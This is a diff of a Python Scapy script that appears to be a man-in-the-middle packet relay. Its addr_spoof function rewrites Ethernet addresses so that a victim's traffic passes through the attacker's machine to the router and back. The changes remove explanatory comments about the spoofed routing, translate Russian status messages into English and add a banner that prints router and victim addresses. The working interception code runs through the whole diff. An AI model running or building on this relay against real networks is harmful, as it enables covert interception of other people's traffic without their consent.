@@ -15,25 +15,20 @@ my_mac = scapy.get_if_hwaddr(iface)
 
 def addr_spoof(packet):
     global ip_dst, mac_dst, ip_src, mac_src, iface
-    #Norm 192.168.100.8:dst_mac   ->   23.23.23.23:src_mac 
-    #Norm 23.23.23.23:src_mac     ->   192.168.100.1:dst_mac
-    
-    #Spof 192.168.100.8:dst_mac   ->   23.23.23.23:my_mac
-    #Spof 23.23.23.23:my_mac      ->   192.168.100.1:dst_mac
     if packet.haslayer(IP) and packet.haslayer(Ether):
         
         # Пакет ОТ жертвы → отправляем на роутер
         if packet[Ether].src == mac_dst and packet[Ether].dst == my_mac:
             packet[Ether].dst = mac_src
             scapy.sendp(packet, iface=iface, verbose=0)
-            print(f"[→] {packet[IP].src} -> {packet[IP].dst} (переслано на роутер)")
+            print(f"[->] {packet[IP].src} -> {packet[IP].dst} (sended to router)")
 
         # Пакет К жертве → отправляем жертве
         elif packet[IP].dst == ip_dst and packet[Ether].dst == my_mac:
             packet[Ether].dst = mac_dst
             packet[Ether].src = my_mac
             scapy.sendp(packet, iface=iface, verbose=0)
-            print(f"[←] {packet[IP].src} -> {packet[IP].dst} (переслано жертве)")
+            print(f"[<-] {packet[IP].src} -> {packet[IP].dst} (sended to victim)")
 
 def ip_forward(args):
     global ip_dst, mac_dst, ip_src, mac_src
@@ -71,4 +66,8 @@ if __name__ == '__main__':
     args['ip_src'] = arg.ip_src
     args['mac_src'] = arg.mac_src
     args['iface'] = arg.iface
+    print("IP Forwarding, version: 2.0")
+    print("*IP Forwarding started.")
+    print(f'Router: {args['ip_src']}_{args['mac_src']}')
+    print(f'Victim: {args['ip_dst']}_{args['mac_dst']}')
     ip_forward(args)
